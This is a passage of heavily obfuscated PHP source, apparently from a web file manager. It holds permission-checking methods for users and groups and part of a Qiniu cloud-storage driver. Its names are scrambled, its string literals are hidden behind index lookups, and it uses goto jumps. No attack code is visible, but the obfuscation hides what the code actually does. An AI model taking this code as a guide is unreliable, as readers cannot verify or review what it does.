$ı’¨î±ë) { $‹¬»Ö™ = $à¦˜ë”->getInfo($ı’¨î±ë); if (!$‹¬»Ö™ || !is_array($‹¬»Ö™[$©Ô§£ğµ[86]])) { continue; } $‹©àö—[] = $‹¬»Ö™[$©Ô§£ğµ[86]][$©Ô§£ğµ[411]]; } } $ö¯ˆ•ßí = array(); $ª¸Ø·öÊ = $õ¸˜Ìï˜; $Ø‹¦­‡€ = Model($©Ô§£ğµ[1339]); $à¦˜ë” = Model($©Ô§£ğµ[531]); $¦€üÎ¦× = array(); $Úªµ¹¢ş = array(); $²Åäæ™” = array(); $è‹ùè£² = array(); if ($‹©àö—) { $Á„øµÑ = $Ø‹¦­‡€->where(array($©Ô§£ğµ[411] => array($©Ô§£ğµ[427], $‹©àö—)))->select(); foreach ($Á„øµÑ as $ñöÜ¨ç¯) { $ÔšÅµ½ı = $Ø‹¦­‡€->parentLevelArray($ñöÜ¨ç¯[$©Ô§£ğµ[530]]); $ö¯ˆ•ßí = array_merge($ö¯ˆ•ßí, $ÔšÅµ½ı); $ª¸Ø·öÊ[] = $ñöÜ¨ç¯[$©Ô§£ğµ[514]]; $¦€üÎ¦×[$ñöÜ¨ç¯[$©Ô§£ğµ[411]]] = $ÔšÅµ½ı; $Úªµ¹¢ş[$ñöÜ¨ç¯[$©Ô§£ğµ[411]]] = $ñöÜ¨ç¯[$©Ô§£ğµ[514]]; } } $ª¸Ø·öÊ = array_values(array_unique($ª¸Ø·öÊ)); $˜é¾³ĞŠ = $ª¸Ø·öÊ; foreach ($˜é¾³ĞŠ as $ı’¨î±ë) { $‹¬»Ö™ = $à¦˜ë”->getInfo($ı’¨î±ë); $ÔšÅµ½ı = $Ø‹¦­‡€->parentLevelArray($‹¬»Ö™[$©Ô§£ğµ[530]]); $ª¸Ø·öÊ = array_merge($ª¸Ø·öÊ, $ÔšÅµ½ı); } $ª¸Ø·öÊ = array_values(array_unique($ª¸Ø·öÊ)); foreach ($ª¸Ø·öÊ as $ı’¨î±ë) { $‹¬»Ö™ = $à¦˜ë”->getInfo($ı’¨î±ë); $ö¯ˆ•ßí[] = $‹¬»Ö™[$©Ô§£ğµ[86]][$©Ô§£ğµ[411]]; $²Åäæ™”[$ı’¨î±ë] = $‹¬»Ö™[$©Ô§£ğµ[86]][$©Ô§£ğµ[411]]; $è‹ùè£²[$ı’¨î±ë] = $Ø‹¦­‡€->parentLevelArray($‹¬»Ö™[$©Ô§£ğµ[530]]); } foreach ($¦€üÎ¦× as $“ŠÁü×Ğ => $‹¦Ğßş§) { $Šó½ÕÔı = $Úªµ¹¢ş[$“ŠÁü×Ğ]; if (!$Šó½ÕÔı || !$²Åäæ™”[$Šó½ÕÔı]) { continue; } $öÏ³¬ì = array(); foreach ($è‹ùè£²[$Šó½ÕÔı] as $ı’¨î±ë) { $öÏ³¬ì[] = $²Åäæ™”[$ı’¨î±ë]; } $¦€üÎ¦×[$“ŠÁü×Ğ] = array_merge($öÏ³¬ì, $‹¦Ğßş§); } $ö¯ˆ•ßí = array_values(array_unique($ö¯ˆ•ßí)); $ÛùÓŞ¾É = array($©Ô§£ğµ[2046] => $ö¯ˆ•ßí, $©Ô§£ğµ[2047] => $¦€üÎ¦×); $úğ¿ƒ¢Ú[$»¢¡ã¡ö] = $ÛùÓŞ¾É; return $ÛùÓŞ¾É; } private function makeSourceAuth($¶’Øºçõ, $éÁ†´ü, $®š¾ïÄ = false) { $Äö’­Ïí =& $_SERVER[Ü©»’·]; $ğŒìƒ›İ = $Äö’­Ïí[88]; $à«¤öÂ¼ = $¶’Øºçõ[$Äö’­Ïí[514]]; $Ô›ôË¾ı = $¶’Øºçõ[$Äö’­Ïí[420]] == SourceModel::TYPE_GROUP; $Ÿ»êˆªâ = $Ô›ôË¾ı ? $this->groupRootAuth($à«¤öÂ¼, $®š¾ïÄ) : !1; if ($Ÿ»êˆªâ && Model($Äö’­Ïí[516])->authCheckAction($Ÿ»êˆªâ[$Äö’­Ïí[422]], $Äö’­Ïí[1879])) { return $this->groupAuthInfo($Ÿ»êˆªâ, $à«¤öÂ¼); } $¤Ùµ¢æÑ = Model($Äö’­Ïí[1339])->parentLevelArray($¶’Øºçõ[$Äö’­Ïí[530]]); $¤Ùµ¢æÑ = array_merge(array($¶’Øºçõ[$Äö’­Ïí[411]]), array_reverse($¤Ùµ¢æÑ)); $¼³·¼˜Ä = !1; foreach ($¤Ùµ¢æÑ as $Àô×‹£±) { if (!isset($éÁ†´ü[$Àô×‹£±])) { continue; } $¨ĞİüÊé = $this->authMake($éÁ†´ü[$Àô×‹£±], $®š¾ïÄ); if ($¨ĞİüÊé[$Äö’­Ïí[476]]) { $¼³·¼˜Ä = $¨ĞİüÊé; break; } } if (!$Ô›ôË¾ı) { return $¼³·¼˜Ä; } if (!$¼³·¼˜Ä && $Ÿ»êˆªâ) { $¼³·¼˜Ä = $this->groupAuthInfo($Ÿ»êˆªâ, $à«¤öÂ¼); } if (!$¼³·¼˜Ä) { $ÕÔï±· = Model($Äö’­Ïí[531])->getInfo($à«¤öÂ¼); $”ç¼”®˜ = explode($Äö’­Ïí[50], trim($ÕÔï±·[$Äö’­Ïí[530]], $Äö’­Ïí[50])); $”ç¼”®˜ = array_reverse($”ç¼”®˜); foreach ($”ç¼”®˜ as $Í¡×¼˜·) { if ($Í¡×¼˜· == $Äö’­Ïí[197] || $Í¡×¼˜· == $ğŒìƒ›İ) { continue; } $ÒÜ€¼ù = $this->groupRootAuth($Í¡×¼˜·, $®š¾ïÄ); if (!$ÒÜ€¼ù) { continue; } $¼³·¼˜Ä = $this->groupAuthInfo($ÒÜ€¼ù, $Í¡×¼˜·); break; } } if (!$¼³·¼˜Ä || $¼³·¼˜Ä[$Äö’­Ïí[423]] <= 0) { $¦õä„¼§ = $this->authDeepCheck($¶’Øºçõ[$Äö’­Ïí[411]], $®š¾ïÄ); if ($¦õä„¼§) { $¼³·¼˜Ä = $¦õä„¼§; } } return $¼³·¼˜Ä; } private function userIsRoot($°¼õ…Û = false) { $«ÒÕ¬Ù“ =& $_SERVER[Ü©»’·]; if (!$°¼õ…Û && _get($GLOBALS, $«ÒÕ¬Ù“[512])) { return !0; } $ÙÉ…áªÏ = Model($«ÒÕ¬Ù“[544])->getInfo($°¼õ…Û); $âü¶·›Ó = Model($«ÒÕ¬Ù“[2055])->listData($ÙÉ…áªÏ[$«ÒÕ¬Ù“[1548]]); if ($âü¶·›Ó && $âü¶·›Ó[$«ÒÕ¬Ù“[520]][$«ÒÕ¬Ù“[2056]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ÄÎ±´¢ä) { $ç´Î™Û÷ =& $_SERVER[Ü©»’·]; $¿Àòòß = Model($ç´Î™Û÷[1339]); $ÕıµÌ‰ = $¿Àòòß->sourceInfo($ÄÎ±´¢ä); if (!$ÕıµÌ‰) { return !1; } $¿Àòòß->groupPathDisplay($ÕıµÌ‰); $°ÛàèšÊ = array($ÕıµÌ‰); $°ÛàèšÊ = $¿Àòòß->_listAppendPath($°ÛàèšÊ); $ÕıµÌ‰ = $°ÛàèšÊ[0]; $‹©¾öã = $ÕıµÌ‰[$ç´Î™Û÷[528]]; if (isset($ÕıµÌ‰[$ç´Î™Û÷[536]])) { $µæ£¶èı = explode($ç´Î™Û÷[8], trim($ÕıµÌ‰[$ç´Î™Û÷[528]], $ç´Î™Û÷[8])); array_shift($µæ£¶èı); $‹©¾öã = $ÕıµÌ‰[$ç´Î™Û÷[534]] . $ç´Î™Û÷[2057] . implode($ç´Î™Û÷[8], $µæ£¶èı); } return array($ç´Î™Û÷[429] => $ÕıµÌ‰[$ç´Î™Û÷[32]], $ç´Î™Û÷[84] => KodIO::make($ÕıµÌ‰[$ç´Î™Û÷[411]]), $ç´Î™Û÷[2058] => $‹©¾öã); } private function groupAuthInfo($†‰›çëÇ, $Ì¬¡£äœ) { $¯é¦Ù =& $_SERVER[Ü©»’·]; $ïŞµÈë¨ = Model($¯é¦Ù[531])->getInfo($Ì¬¡£äœ); return array($¯é¦Ù[2059] => intval($†‰›çëÇ[$¯é¦Ù[422]]), $¯é¦Ù[2043] => $†‰›çëÇ, $¯é¦Ù[2060] => LNG($¯é¦Ù[2061]), $¯é¦Ù[2052] => array($¯é¦Ù[429] => $ïŞµÈë¨[$¯é¦Ù[32]], $¯é¦Ù[84] => KodIO::make($ïŞµÈë¨[$¯é¦Ù[86]][$¯é¦Ù[411]]), $¯é¦Ù[2058] => $ïŞµÈë¨[$¯é¦Ù[535]])); } protected function groupRootAuth($´€ÇĞ•Ÿ, $°ş¹ÕÌ = false) { $í‘¼Óèß =& $_SERVER[Ü©»’·]; $°ş¹ÕÌ = $°ş¹ÕÌ ? $°ş¹ÕÌ : USER_ID; $â‹¸Í‹¨ = $°ş¹ÕÌ . $í‘¼Óèß[2062] . $´€ÇĞ•Ÿ; static $ÒĞß÷‚Î = array(); if (isset($ÒĞß÷‚Î[$â‹¸Í‹¨])) { return $ÒĞß÷‚Î[$â‹¸Í‹¨]; } $ê›á•îØ = Model($í‘¼Óèß[531])->getInfo($´€ÇĞ•Ÿ); $ÓßØÊ¤Í = $this->userGroupList($°ş¹ÕÌ); $‹ú â£Ù = isset($ÓßØÊ¤Í[$´€ÇĞ•Ÿ]) ? $ÓßØÊ¤Í[$´€ÇĞ•Ÿ][$í‘¼Óèß[422]] : !1; if ($‹ú â£Ù && Model($í‘¼Óèß[516])->authCheckAction($‹ú â£Ù[$í‘¼Óèß[422]], $í‘¼Óèß[1879])) { $ÒĞß÷‚Î[$â‹¸Í‹¨] = $‹ú â£Ù; return $‹ú â£Ù; } $Ò£ä ¼¼ = $this->sourceAuthSelect($ê›á•îØ[$í‘¼Óèß[86]][$í‘¼Óèß[411]]); $É–ª—È‚ = $Ò£ä ¼¼ ? $this->authMake($Ò£ä ¼¼, $°ş¹ÕÌ) : !1; $œÌíÜåÏ = $É–ª—È‚ ? $É–ª—È‚[$í‘¼Óèß[476]] : !1; $ÒĞß÷‚Î[$â‹¸Í‹¨] = $œÌíÜåÏ ? $œÌíÜåÏ : $‹ú â£Ù; return $ÒĞß÷‚Î[$â‹¸Í‹¨]; } public function authOwnerApply($‚ª½Ó¼) { $«¾½ï’Ø =& $_SERVER[Ü©»’·]; if (empty($‚ª½Ó¼[$«¾½ï’Ø[422]]) || isset($‚ª½Ó¼[$«¾½ï’Ø[2063]]) && $‚ª½Ó¼[$«¾½ï’Ø[2063]]) { return $‚ª½Ó¼; } if (AuthModel::authCheckRoot($‚ª½Ó¼[$«¾½ï’Ø[422]][$«¾½ï’Ø[423]])) { return $‚ª½Ó¼; } $Ğ¦Œ—×÷ = Model($«¾½ï’Ø[1339])->parentLevelArray($‚ª½Ó¼[$«¾½ï’Ø[530]]); $Ğ¦Œ—×÷ = array_merge(array($‚ª½Ó¼[$«¾½ï’Ø[411]]), array_reverse($Ğ¦Œ—×÷)); $ı¤Æş’“ = $this->sourceAuthSelect($Ğ¦Œ—×÷); $©ÇÓ“ˆ‹ = array(); $™Çû¥üÂ = array(); foreach ($ı¤Æş’“ as $ÍåÔ±¾À => $·€Ù‹å¼) { $€¹ÂÕÔÅ = $this->authFolderOwnerUser($·€Ù‹å¼); $©ÇÓ“ˆ‹[$ÍåÔ±¾À] = $€¹ÂÕÔÅ; $™Çû¥üÂ = array_merge($™Çû¥üÂ, $€¹ÂÕÔÅ[$«¾½ï’Ø[609]]); if ($€¹ÂÕÔÅ[$«¾½ï’Ø[2064]]) { break; } } if (count($™Çû¥üÂ) == 0) { $™Çû¥üÂ = $this->authFolderOwnerGroup($‚ª½Ó¼[$«¾½ï’Ø[514]]); } $™Çû¥üÂ = array_unique($™Çû¥üÂ); if (AuthModel::authCheckRoot($‚ª½Ó¼[$«¾½ï’Ø[422]][$«¾½ï’Ø[423]])) { $™Çû¥üÂ[] = USER_ID; } $‚ª½Ó¼[$«¾½ï’Ø[422]][$«¾½ï’Ø[2065]] = Model($«¾½ï’Ø[522])->userListInfo($™Çû¥üÂ); return $‚ª½Ó¼; } private function authFolderOwnerGroup($Ğ‹Í¿¡) { $í„ÉÜÆı =& $_SERVER[Ü©»’·]; $ğÄ²« = Model($í„ÉÜÆı[1948])->where(array($í„ÉÜÆı[1858] => $Ğ‹Í¿¡))->select(); $ÙÕˆÎÕŠ = array(); if (!$ğÄ²«) { return $ÙÕˆÎÕŠ; } foreach ($ğÄ²« as $Î¯Ÿ˜á) { $ÓïÖÕèå = $this->authInfo($Î¯Ÿ˜á); if (AuthModel::authCheckRoot($ÓïÖÕèå[$í„ÉÜÆı[422]])) { $ÙÕˆÎÕŠ[] = $Î¯Ÿ˜á[$í„ÉÜÆı[1669]]; } } return $ÙÕˆÎÕŠ; } private function authFolderOwnerUser($½Š‡¯²¢) { $×Åçû÷Ô =& $_SERVER[Ü©»’·]; $Ñİ…à«× = array(); $šêĞ±±ò = !1; foreach ($½Š‡¯²¢ as $ÈŸ®ˆº¡) { $Úå±úöº = $this->authInfo($ÈŸ®ˆº¡); if ($ÈŸ®ˆº¡[$×Åçû÷Ô[514]] == $×Åçû÷Ô[197]) { $šêĞ±±ò = !0; } if ($ÈŸ®ˆº¡[$×Åçû÷Ô[420]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Úå±úöº[$×Åçû÷Ô[422]])) { $Ñİ…à«×[] = $ÈŸ®ˆº¡[$×Åçû÷Ô[514]]; } } } return array($×Åçû÷Ô[609] => $Ñİ…à«×, $×Åçû÷Ô[2064] => $šêĞ±±ò); } public function authMake($§ĞÔâØ, $Ã©æ»ô = false) { $û¿‘°¸Ø =& $_SERVER[Ü©»’·]; $²Î•Ÿ‘Æ = $this->authArrayCheck($§ĞÔâØ, $Ã©æ»ô); if ($²Î•Ÿ‘Æ[$û¿‘°¸Ø[2066]]) { $²Î•Ÿ‘Æ[$û¿‘°¸Ø[2066]] = $this->sourceAuthInfo($²Î•Ÿ‘Æ[$û¿‘°¸Ø[2066]]); } return $²Î•Ÿ‘Æ; } public function authArrayCheck($¯ö¤£ˆê, $ØÁì¼¥µ = false) { $¨ø—Ã“¥ =& $_SERVER[Ü©»’·]; if (!$¯ö¤£ˆê) { return array($¨ø—Ã“¥[423] => 0, $¨ø—Ã“¥[476] => !1); } $ØÁì¼¥µ = $ØÁì¼¥µ ? $ØÁì¼¥µ : USER_ID; $øúÙ = 0; $Ë²­Ğè = 0; $Š†ö‹€à = 0; $Ù‹Šµ¨Ö = 0; $†º‰¹¥ = 0; $¤˜ğÛœ¢ = 0; $¾§¨š°Ş = 1000; $†Åï–‹ß = 0; $…ë®ÆœÕ = 0; $ÕÔ§¡’• = 0; $ıŠ›ŞûÚ = 0; $ğ¢£š½ = array($¨ø—Ã“¥[411] => 0); foreach ($¯ö¤£ˆê as $ğ¢£š½) { $ƒ²àÂ§ = $this->authInfo($ğ¢£š½); if (!$ƒ²àÂ§) { continue; } $®¿Ñ„÷Š = $ğ¢£š½[$¨ø—Ã“¥[514]]; $ƒ–œş¹µ = intval($ƒ²àÂ§[$¨ø—Ã“¥[422]]); if ($ğ¢£š½[$¨ø—Ã“¥[420]] == SourceModel::TYPE_USER && $®¿Ñ„÷Š == $ØÁì¼¥µ) { $øúÙ = !0; $Š†ö‹€à = $ƒ²àÂ§; $Ë²­Ğè = $ƒ–œş¹µ; } else { if ($ğ¢£š½[$¨ø—Ã“¥[420]] == SourceModel::TYPE_GROUP && $this->groupContainUser($®¿Ñ„÷Š, $ØÁì¼¥µ)) { $Ù‹Šµ¨Ö = !0; $ÔœÍ¶Úù = $this->groupStepToUserGroup($®¿Ñ„÷Š, $ØÁì¼¥µ); if ($ÔœÍ¶Úù < $¾§¨š°Ş) { $¾§¨š°Ş = $ÔœÍ¶Úù; $†º‰¹¥ = $ƒ–œş¹µ; $¤˜ğÛœ¢ = $ƒ²àÂ§; $†Åï–‹ß = $®¿Ñ„÷Š; } if ($ÔœÍ¶Úù == $¾§¨š°Ş && $ƒ–œş¹µ >= $†º‰¹¥) { $†º‰¹¥ = $ƒ–œş¹µ; $¤˜ğÛœ¢ = $ƒ²àÂ§; $†Åï–‹ß = $®¿Ñ„÷Š; } } else { if ($®¿Ñ„÷Š == $¨ø—Ã“¥[197]) { $…ë®ÆœÕ = !0; $ıŠ›ŞûÚ = $ƒ²àÂ§; $ÕÔ§¡’• = $ƒ–œş¹µ; } } } } if ($øúÙ) { $íÏ»É¨ = $Ë²­Ğè; $ƒ²àÂ§ = $Š†ö‹€à; $–‹Ë»ûè = LNG($¨ø—Ã“¥[2067]); } else { if ($Ù‹Šµ¨Ö) { $íÏ»É¨ = $†º‰¹¥; $ƒ²àÂ§ = $¤˜ğÛœ¢; $ Àî²Ÿ = Model($¨ø—Ã“¥[531])->getInfo($†Åï–‹ß); $–‹Ë»ûè = $¨ø—Ã“¥[162] . $ Àî²Ÿ[$¨ø—Ã“¥[535]] . $¨ø—Ã“¥[2068] . LNG($¨ø—Ã“¥[2069]); } else { if ($…ë®ÆœÕ) { $íÏ»É¨ = $ÕÔ§¡’•; $ƒ²àÂ§ = $ıŠ›ŞûÚ; $–‹Ë»ûè = LNG($¨ø—Ã“¥[2040]); } else { $íÏ»É¨ = 0; $ƒ²àÂ§ = !1; $–‹Ë»ûè = $¨ø—Ã“¥[12]; } } } $ƒãºÚÒ® = array($¨ø—Ã“¥[2059] => intval($íÏ»É¨), $¨ø—Ã“¥[2043] => $ƒ²àÂ§, $¨ø—Ã“¥[2060] => $–‹Ë»ûè, $¨ø—Ã“¥[2052] => $ğ¢£š½[$¨ø—Ã“¥[411]]); return $ƒãºÚÒ®; } private function groupContainUser($§ƒ îù‘, $òÈıûşû = false) { return in_array($§ƒ îù‘, $this->userGroupParents($òÈıûşû)); } private function groupStepToUserGroup($”¼æš“Â, $ı‚»šàÆ = false) { $¬úÒÀ¡ë =& $_SERVER[Ü©»’·]; $¹ÈÁœ¢¨ = $this->userGroupList($ı‚»šàÆ); $åÚ¸éÂ  = 1000; $ÂšÁß—÷ = $GLOBALS[$¬úÒÀ¡ë[6]][$¬úÒÀ¡ë[89]][$¬úÒÀ¡ë[1961]] == 1; $šñ”•åÂ = $ÂšÁß—÷ ? 3 : 2; foreach ($¹ÈÁœ¢¨ as $õ…™ãÄñ) { if ($õ…™ãÄñ[$¬úÒÀ¡ë[1858]] == $”¼æš“Â) { return 0; } $©Ç¹¤®š = explode($¬úÒÀ¡ë[50], trim($õ…™ãÄñ[$¬úÒÀ¡ë[530]], $¬úÒÀ¡ë[50])); if ($©Ç¹¤®š[0] == $¬úÒÀ¡ë[197] && count($©Ç¹¤®š) > $šñ”•åÂ) { $Şá–÷Ü± = array_reverse(array_slice($©Ç¹¤®š, $šñ”•åÂ)); $ßÍ´¥Åş = array_search($”¼æš“Â, $Şá–÷Ü±); if ($ßÍ´¥Åş !== !1 && $ßÍ´¥Åş + 1 <= $åÚ¸éÂ ) { $åÚ¸éÂ  = $ßÍ´¥Åş + 1; } } } return $åÚ¸éÂ ; } private function userGroupList($µööåÏ = false) { $Ìô æ¦Æ =& $_SERVER[Ü©»’·]; static $Û€§òí¤ = array(); if (isset($Û€§òí¤[$µööåÏ])) { return $Û€§òí¤[$µööåÏ]; } $¸‘ÑÊ—Û = Model($Ìô æ¦Æ[544])->getInfo($µööåÏ); $Û€§òí¤[$µööåÏ] = array_to_keyvalue($¸‘ÑÊ—Û[$Ìô æ¦Æ[2041]], $Ìô æ¦Æ[1858]); return $Û€§òí¤[$µööåÏ]; } public function userGroupParents($ÅòÁÑ·á) { $ùşóéªç =& $_SERVER[Ü©»’·]; static $„¿‡–ªÎ = array(); $ÅòÁÑ·á = $ÅòÁÑ·á ? $ÅòÁÑ·á : USER_ID; if (isset($„¿‡–ªÎ[$ÅòÁÑ·á])) { return $„¿‡–ªÎ[$ÅòÁÑ·á]; } $¥€®åš = $this->userGroupList($ÅòÁÑ·á); $»ÖºË¬ = array(); $Š‡÷œÀÖ = $GLOBALS[$ùşóéªç[6]][$ùşóéªç[89]][$ùşóéªç[1961]] == 1; $¢¶ĞÄûŞ = $Š‡÷œÀÖ ? 3 : 2; foreach ($¥€®åš as $õÏµËË†) { $ªµ·»¢ğ = array($õÏµËË†[$ùşóéªç[1858]]); $éŞ¬€œø = explode($ùşóéªç[50], trim($õÏµËË†[$ùşóéªç[530]], $ùşóéªç[50])); if ($éŞ¬€œø[0] == $ùşóéªç[197] && count($éŞ¬€œø) > $¢¶ĞÄûŞ) { $¨’Ã€ = array_slice($éŞ¬€œø, $¢¶ĞÄûŞ); $ªµ·»¢ğ = array_merge($ªµ·»¢ğ, array_reverse($¨’Ã€)); } $»ÖºË¬ = array_merge($»ÖºË¬, $ªµ·»¢ğ); } $„¿‡–ªÎ[$ÅòÁÑ·á] = array_unique($»ÖºË¬); return $„¿‡–ªÎ[$ÅòÁÑ·á]; } public function authTargetInfoMake($“ÏŞ±ƒ) { $Ø×­ş­ª =& $_SERVER[Ü©»’·]; $Çœô¬ÍÙ = array(); $»ö¿ÉŠÑ = array(); foreach ($“ÏŞ±ƒ as $íüÑÜ­¡) { if ($íüÑÜ­¡[$Ø×­ş­ª[420]] == SourceModel::TYPE_USER) { $Çœô¬ÍÙ[] = intval($íüÑÜ­¡[$Ø×­ş­ª[514]]); } else { if ($íüÑÜ­¡[$Ø×­ş­ª[420]] == SourceModel::TYPE_GROUP) { $»ö¿ÉŠÑ[] = intval($íüÑÜ­¡[$Ø×­ş­ª[514]]); } } } if ($Çœô¬ÍÙ) { $Çœô¬ÍÙ = Model($Ø×­ş­ª[522])->userListInfo($Çœô¬ÍÙ); } if ($»ö¿ÉŠÑ) { $óÆÊ´ò© = array($Ø×­ş­ª[1946] => array($Ø×­ş­ª[427], $»ö¿ÉŠÑ)); $»ö¿ÉŠÑ = Model($Ø×­ş­ª[531])->field($Ø×­ş­ª[2070])->where($óÆÊ´ò©)->select(); $»ö¿ÉŠÑ = array_to_keyvalue($»ö¿ÉŠÑ, $Ø×­ş­ª[1858]); } return array($Ø×­ş­ª[2071] => $Çœô¬ÍÙ, $Ø×­ş­ª[2072] => $»ö¿ÉŠÑ); } public function authInfo($ğË§·©æ) { $½¹ÙÈÇå =& $_SERVER[Ü©»’·]; if ($ğË§·©æ[$½¹ÙÈÇå[1962]]) { $Óï˜æü  = Model($½¹ÙÈÇå[516])->listData($ğË§·©æ[$½¹ÙÈÇå[1962]]); if (!$Óï˜æü ) { return !1; $Ûºú±–Ù = Model($½¹ÙÈÇå[516])->listData(); $Æ¤ñæÏ± = array_filter_by_field($Ûºú±–Ù, $½¹ÙÈÇå[422], $½¹ÙÈÇå[197]); return $Æ¤ñæÏ±; } $÷ñá¢õ÷ = array_field_key($Óï˜æü , array($½¹ÙÈÇå[408], $½¹ÙÈÇå[32], $½¹ÙÈÇå[422], $½¹ÙÈÇå[1881], $½¹ÙÈÇå[1882])); $÷ñá¢õ÷[$½¹ÙÈÇå[2073]] = $ğË§·©æ; return $÷ñá¢õ÷; } else { return array($½¹ÙÈÇå[428] => 0, $½¹ÙÈÇå[1864] => $ğË§·©æ[$½¹ÙÈÇå[2018]], $½¹ÙÈÇå[429] => $½¹ÙÈÇå[12], $½¹ÙÈÇå[1881] => $½¹ÙÈÇå[2074]); } } } goto BàŞ”…êùˆ; f÷Û‹¡ˆï»: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($â½£¦Ê) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ü©»’·][1437]; $this->_init($â½£¦Ê); } public function _init($õÊ¢¢û) { $È«Ş·³Í =& $_SERVER[Ü©»’·]; foreach ($õÊ¢¢û as $“ã¥œµˆ => $ ¡ìŞÛÉ) { if (isset($this->{$“ã¥œµˆ})) { $this->{$“ã¥œµˆ} = $ ¡ìŞÛÉ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($È«Ş·³Í[1438] . LNG($È«Ş·³Í[1396])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($¶‚…á´É, $Ñ‘„ÅÇ½ = '', $±Ãê‚¯ = REPEAT_RENAME) { if ($this->setContent($¶‚…á´É, $Ñ‘„ÅÇ½)) { return $this->getPathOuter($¶‚…á´É); } return !1; } public function mkdir($ó­Î¯¦—, $ç£†º—¾ = REPEAT_SKIP) { $†–¸Ïë =& $_SERVER[Ü©»’·]; $ì½Ğ« = trim($ó­Î¯¦—, $†–¸Ïë[8]); if ($this->_isFolder($ì½Ğ«)) { return $this->getPathOuter($ì½Ğ«); } $ó­Î¯¦— = $ì½Ğ« . $†–¸Ïë[8]; $¥âÕÍÒŸ = get_path_this($ì½Ğ«); $Üï¥Äø = $ó­Î¯¦— . $¥âÕÍÒŸ; if (!$this->mkfile($Üï¥Äø)) { return !1; } if (!$this->moveFile($Üï¥Äø, $ó­Î¯¦—)) { $this->delFile($Üï¥Äø); return !1; } return $this->getPathOuter($ì½Ğ«); } public function copyFile($Äêò¿Ì´, $½ƒ¢«) { $˜¦âªÎ¤ = $this->bucketManager->copy($this->bucket, $Äêò¿Ì´, $this->bucket, $½ƒ¢«, !0); return $˜¦âªÎ¤ ? !1 : $this->getPathOuter($½ƒ¢«); } public function moveFile($îÒà’«, $ä·î„) { $Šä‡šÅÇ = $this->bucketManager->move($this->bucket, $îÒà’«, $this->bucket, $ä·î„, !0); return $Šä‡šÅÇ ? !1 : $this->getPathOuter($ä·î„); } public function delFile($¹®Í·É’) { if (!$this->exist($¹®Í·É’)) { return !0; } $²ã‚ƒ¸µ = $this->bucketManager->delete($this->bucket, $¹®Í·É’); return $²ã‚ƒ¸µ ? !1 : !0; } public function delFolder($ğâãº™Á) { $»Ùå–× =& $_SERVER[Ü©»’·]; if (!$this->exist($ğâãº™Á)) { return !0; } $this->listItemCache = !1; $Óå„·Ó = $this->fileList($ğâãº™Á); $this->listItemCache = !0; $ÔÁ©óÍ… = trim($ğâãº™Á, $»Ùå–×[8]) . $»Ùå–×[8]; if (!empty($ğâãº™Á) && $ğâãº™Á !== $»Ùå–×[197] && !in_array($ÔÁ©óÍ…, $Óå„·Ó[$»Ùå–×[82]])) { $Óå„·Ó[$»Ùå–×[82]][] = $ÔÁ©óÍ…; } $Å¸÷‰ñ = $this->delByBatch($Óå„·Ó[$»Ùå–×[83]]); if (!$Å¸÷‰ñ) { return !1; } $Å¸÷‰ñ = $this->delByBatch($Óå„·Ó[$»Ùå–×[82]]); if (!$Å¸÷‰ñ) { return !1; } return $this->delFile($ÔÁ©óÍ…); } private function delByBatch($¿œ–ñíÀ) { foreach (array_chunk($¿œ–ñíÀ, 1000) as $îùÁû± ) { $½ÖàÎ€Ë = $this->bucketManager->buildBatchDelete($this->bucket, $îùÁû± ); list($²åÊ“Õ·, $óî¼è„å) = $this->bucketManager->batch($½ÖàÎ€Ë); if ($óî¼è„å) { return !1; } } return !0; } public function rename($®êŸàãÅ, $é”ŠÅÖ) { return $this->renameObject($®êŸàãÅ, $é”ŠÅÖ); } public function fileInfo($§ˆîœ®ä, $ÈÉœšìĞ = false, $šúä©•€ = array()) { $ÁñÊÚ’‚ =& $_SERVER[Ü©»’·]; $Õ›ª¯Ç” = array($ÁñÊÚ’‚[32] => $this->pathThis($§ˆîœ®ä), $ÁñÊÚ’‚[84] => $this->getPathOuter($ÁñÊÚ’‚[8] . $§ˆîœ®ä), $ÁñÊÚ’‚[33] => $ÁñÊÚ’‚[199], $ÁñÊÚ’‚[76] => isset($šúä©•€[$ÁñÊÚ’‚[1439]]) ? $šúä©•€[$ÁñÊÚ’‚[1439]] : 0, $ÁñÊÚ’‚[174] => $this->ext($§ˆîœ®ä)); if ($ÈÉœšìĞ) { return $Õ›ª¯Ç”; } $Õ›ª¯Ç”[$ÁñÊÚ’‚[200]] = $Õ›ª¯Ç”[$ÁñÊÚ’‚[85]] = 0; $Õ›ª¯Ç”[$ÁñÊÚ’‚[201]] = $Õ›ª¯Ç”[$ÁñÊÚ’‚[202]] = !0; if (empty($šúä©•€)) { $šúä©•€ = $this->objectMeta($§ˆîœ®ä); if (!$šúä©•€) { return $Õ›ª¯Ç”; } } if (isset($šúä©•€[$ÁñÊÚ’‚[1440]])) { $Õ›ª¯Ç”[$ÁñÊÚ’‚[85]] = substr($šúä©•€[$ÁñÊÚ’‚[1440]] . $ÁñÊÚ’‚[12], 0, 10); } if (isset($šúä©•€[$ÁñÊÚ’‚[1439]])) { $Õ›ª¯Ç”[$ÁñÊÚ’‚[76]] = $šúä©•€[$ÁñÊÚ’‚[1439]]; } return $Õ›ª¯Ç”; } public function folderInfo($õŞ°ğ”À, $’øÔŒÁ‹ = false) { $ƒ’œ•  =& $_SERVER[Ü©»’·]; $»´êº‘ğ = array($ƒ’œ• [32] => $this->pathThis($õŞ°ğ”À), $ƒ’œ• [84] => $this->getPathOuter($ƒ’œ• [8] . $õŞ°ğ”À), $ƒ’œ• [33] => $ƒ’œ• [75]); if ($’øÔŒÁ‹) { return $»´êº‘ğ; } $»´êº‘ğ[$ƒ’œ• [200]] = $»´êº‘ğ[$ƒ’œ• [85]] = 0; $»´êº‘ğ[$ƒ’œ• [201]] = $»´êº‘ğ[$ƒ’œ• [202]] = !0; $õŞ°ğ”À = rtrim($õŞ°ğ”À, $ƒ’œ• [8]) . $ƒ’œ• [8]; 